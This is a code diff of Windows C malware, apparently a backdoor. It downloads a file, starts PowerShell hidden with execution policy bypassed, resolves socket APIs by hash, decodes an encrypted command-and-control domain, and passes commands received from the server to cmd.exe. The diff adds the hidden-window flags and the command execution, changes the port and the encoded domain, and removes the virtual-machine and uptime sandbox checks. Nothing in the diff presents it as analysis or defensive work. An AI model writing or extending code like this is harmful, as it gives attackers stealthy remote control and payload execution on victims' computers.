@@ -7,33 +7,14 @@
 #include <lmcons.h>
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
-#define PORT 11736
+#define PORT 10933
 #define BUFFER_SIZE 4096
 
 BOOL is_debugger_present() {
     return IsDebuggerPresent();
 }
 
-BOOL is_running_in_vm() {
-    SYSTEM_INFO sysInfo;
-    GetSystemInfo(&sysInfo);
-    return (sysInfo.dwNumberOfProcessors <= 2);
-}
 
-BOOL is_uptime_suspicious() {
-    DWORD uptime = GetTickCount64() / 1000;
-    return (uptime < 300);
-}
-
-void suspicious_delay_check() {
-    DWORD start = GetTickCount();
-    Sleep(5000);
-    DWORD elapsed = GetTickCount() - start;
-
-    if (elapsed < 4000) {
-        ExitProcess(1);
-    }
-}
 BOOL DownloadFileFromUrl(const char* url, const char* savePath){
     HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
@@ -221,8 +202,7 @@ DWORD base64_encode(const BYTE* input, DWORD input_len, char** output) {
 int main() {
 
     is_debugger_present();
-    is_running_in_vm();
-    is_uptime_suspicious();
+
     const char* user = GetCurrentUserNameString();
     char folder[MAX_PATH];
     snprintf(folder, sizeof(folder), "C:\\Users\\%s\\AppData\\Local\\Temp\\kAiZ3n", user);
@@ -250,8 +230,10 @@ int main() {
     STARTUPINFOA si1 = { 0 };
     PROCESS_INFORMATION pi1 = { 0 };
     si1.cb = sizeof(si1);
+    si1.dwFlags = STARTF_USESHOWWINDOW;
+    si1.wShowWindow = SW_HIDE;
     char commandline[MAX_PATH];
-    snprintf(commandline,sizeof(commandline),"powershell.exe -ExecutionPolicy Bypass -File \"%s\"",outfile);
+    snprintf(commandline,sizeof(commandline),"powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden -NoNewWindow -File \"%s\"",outfile);
     BOOL success = CreateProcessA(NULL, commandline, NULL, NULL, FALSE, 0, NULL, NULL, &si1, &pi1);
     if (success) {
         CloseHandle(pi1.hProcess);
@@ -265,7 +247,7 @@ int main() {
     if (!key || key_len == 0) {
         return 1;
     }
-
+    
     DWORD h_socket = 0xF0D2746A;
     DWORD h_connect = 0x195C4F50;
     DWORD h_send = 0xC68505AD;
@@ -292,7 +274,7 @@ int main() {
     SOCKET s = my_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     struct sockaddr_in srv;
     struct hostent* he;
-    char encDomain[25] = "eKUi/sfhXVkfFHzy0nQ=";
+    char encDomain[25] = "fKUi/sfhXVkfFHzy0nQ=";
     BYTE* dec_base64_domain = NULL;
     DWORD decDomain_len = base64_decode(encDomain, &dec_base64_domain);
     BYTE decrypted_domain[8096] = {0};
@@ -341,11 +323,12 @@ int main() {
                     free(decoded_base64);
                     continue;
                 }
-
+               
                 STARTUPINFOA si = { 0 };
                 PROCESS_INFORMATION pi = { 0 };
                 si.cb = sizeof(si);
-                char cmdline[8096] = {0};
+                char cmdline[MAX_PATH];
+                snprintf(cmdline,sizeof(cmdline),"cmd.exe /c \"%s\"",decrypted_payload);            
                 BOOL success = CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                 if (!success) {
                     continue;
